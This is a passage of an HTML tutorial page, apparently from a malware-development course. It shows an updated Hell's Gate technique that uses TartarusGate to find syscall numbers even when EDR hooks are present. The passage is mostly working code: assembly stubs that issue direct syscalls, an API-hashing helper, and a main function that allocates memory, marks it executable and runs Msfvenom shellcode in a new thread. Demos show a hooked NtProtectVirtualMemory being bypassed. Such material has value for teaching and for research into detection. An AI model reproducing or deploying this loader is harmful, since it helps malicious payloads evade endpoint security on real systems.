+			mov eax, ecx			; eax = ssn
+			mov r8d, eax			; r8d = eax = ssn
+			mov wSystemCall, r8d		; wSystemCall = r8d = eax = ssn
+			ret
+	SetSSn ENDP
+
+	RunSyscall PROC
+			xor r10, r10			; r10 = 0
+			mov rax, rcx			; rax = rcx
+			mov r10, rax			; r10 = rax = rcx
+			mov eax, wSystemCall		; eax = ssn
+			jmp Run                  ; execute &#x27;Run&#x27;
+			xor eax, eax     ; wont run
+			xor rcx, rcx     ; wont run
+			shl r10, 2       ; wont run
+		Run:
+			syscall
+			ret
+	RunSyscall ENDP
+
+end</code></pre>
+        </div><h3 id="updating-the-main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The Main Function</span></h3><h3 id="creating-the-ntapi-func-structure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Creating The NTAPI_FUNC Structure</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The updated Hell&#x27;s Gate implementation is now completed. The last part is to test the implementation which requires the main function. To do so, a new structure is created that replaces the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">VX_TABLE</a>. The new structure, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NTAPI_FUNC</code>, will contain the syscalls&#x27; information. Storing this information in a structure will enable calling the syscalls multiple times when initialized as a global variable.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NTAPI_FUNC</code> structure is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _NTAPI_FUNC
+{
+	NT_SYSCALL	NtAllocateVirtualMemory;
+	NT_SYSCALL	NtProtectVirtualMemory;
+	NT_SYSCALL	NtCreateThreadEx;
+	NT_SYSCALL	NtWaitForSingleObject;
+
+}NTAPI_FUNC, *PNTAPI_FUNC;
+
+// global variable
+NTAPI_FUNC g_Nt = { 0 };</code></pre>
+        </div><h3 id="creating-initializentsyscalls" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Creating InitializeNtSyscalls</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To populate the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_Nt</code> global variable, the newly created function, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeNtSyscalls</code>, will call <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code> to initialize all members of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NTAPI_FUNC</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL InitializeNtSyscalls() {
+
+	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
+		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n&quot;);
+		return FALSE;
+	}
+	printf(&quot;[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtAllocateVirtualMemory.dwSSn);
+
+
+	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
+		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n&quot;);
+		return FALSE;
+	}
+	printf(&quot;[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtProtectVirtualMemory.dwSSn);
+
+
+	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
+		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n&quot;);
+		return FALSE;
+	}
+	printf(&quot;[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n&quot;, g_Nt.NtCreateThreadEx.dwSSn);
+
+
+	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
+		printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n&quot;);
+		return FALSE;
+	}
+	printf(&quot;[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n&quot;, g_Nt.NtWaitForSingleObject.dwSSn);
+
+	return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtAllocateVirtualMemory_CRC32</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory_CRC32</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateThreadEx_CRC32</code>, and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtWaitForSingleObject_CRC32</code> are the hash values of the respective syscalls.</p><h3 id="hasher-program" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Hasher Program</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The syscall hashes are generated using the <em>Hasher</em> program which contains the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">crc32h</code> hashing function. Hasher prints the values of its <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">crc32h</code>&#x27;s function output.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define SEED 0xEDB88320#define STR &quot;_CRC32&quot;unsigned int crc32h(char* message) {
+    int i, crc;
+    unsigned int byte, c;
+    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
+        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
+        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;
+
+    i = 0;
+    crc = 0xFFFFFFFF;
+    while ((byte = message[i]) != 0) {    // Get next byte.
+        crc = crc ^ byte;
+        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
+            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
+            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
+            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
+        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
+        i = i + 1;
+    }
+    return ~crc;
+}
+
+#define HASH(API) crc32h((char*)API)int main() {
+
+    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtAllocateVirtualMemory&quot;, STR, HASH(&quot;NtAllocateVirtualMemory&quot;));
+    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtProtectVirtualMemory&quot;, STR, HASH(&quot;NtProtectVirtualMemory&quot;));
+    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HASH(&quot;NtCreateThreadEx&quot;));
+    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HASH(&quot;NtWaitForSingleObject&quot;));
+}</code></pre>
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-719008069-88be2bdc-b34e-4a9b-a338-91df90cd51a2.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeNtSyscalls</code> function is called first, followed by syscalls to perform a local code injection using Msfvenom&#x27;s shellcode. The call to the syscalls is done using the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">SetSSn</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RunSyscall</code> assembly functions previously described.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">int main() {
+
+	NTSTATUS	STATUS		= NULL;
+	PVOID		pAddress	= NULL;
+	SIZE_T		sSize		= sizeof(Payload);
+	DWORD		dwOld		= NULL;
+	HANDLE		hProcess	= (HANDLE)-1,	// local process
+			    hThread		= NULL;
+
+
+	// initializing the used syscalls
+	if (!InitializeNtSyscalls()) {
+		printf(&quot;[!] Failed To Initialize The Specified Direct-Syscalls \n&quot;);
+		return -1;
+	}
+
+
+	// allocating memory
+	SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
+	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
+		printf(&quot;[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
+		return -1;
+	}
+
+	// copying the payload
+	memcpy(pAddress, Payload, sizeof(Payload));
+	sSize = sizeof(Payload);
+
+	// changing memory protection
+	SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
+	if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
+		printf(&quot;[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
+		return -1;
+	}
+
+
+	// executing the payload
+	SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
+	if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
+		printf(&quot;[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n&quot;, STATUS);
+		return -1;
+	}
+
+
+	// waiting for the payload
+	SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
+	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
+		printf(&quot;[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n&quot;, STATUS);
+		return -1;
+	}
+
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
+	getchar();
+
+	return 0;
+}</code></pre>
+        </div><h3 id="demo-1-without-tartarusgate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo 1 - Without TartarusGate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MalDevEdr.dll</code> is injected into the Hell&#x27;s Gate implementation that does not use TartarusGate to find an SSN. This will fail when searching for the SSN, as expected.</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Injecting <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MalDevEdr.dll</code> into the Hell&#x27;s Gate implementation.
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-819042962-afbc121a-d298-419a-b1e5-89eef05d8fa9.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> is hooked.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-919042983-21be24a2-1648-4a06-afe5-d08ededb7b0e.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• Hell&#x27;s Gate fails.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-10.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="demo-2-with-tartarusgate" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo 2 - With TartarusGate</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MalDevEdr.dll</code> is injected into the Hell&#x27;s Gate implementation that uses TartarusGate to find an SSN. This implementation is able to successfully retrieve the SSN.</p><li style="list-style-type:circle">Injecting <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">MalDevEdr.dll</code> into the Hell&#x27;s Gate implementation that utilizes TartarusGate. Furthermore, breakpoints are inserted in several points in the code for further analysis.</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-11.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• Hitting a breaking point when retrieving the SSN of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code>. Since it&#x27;s hooked, the syscall&#x27;s opcodes aren&#x27;t the same as the usual syscall format.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-12.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• The syscall directly below <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code> is unhooked and so its SSN is retrieved instead. The variable <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">idx</code> has a value of 1.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-13.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">low</code> is 81 (in decimal) and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">high</code> is 0. Calculating this neighboring syscall&#x27;s SSN returns <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x51</code> (in hex) or 81 (in decimal)</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-14.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-15.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• Since the search path was downward, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code>&#x27;s SSN is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">81 - 1 = 80</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-16.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
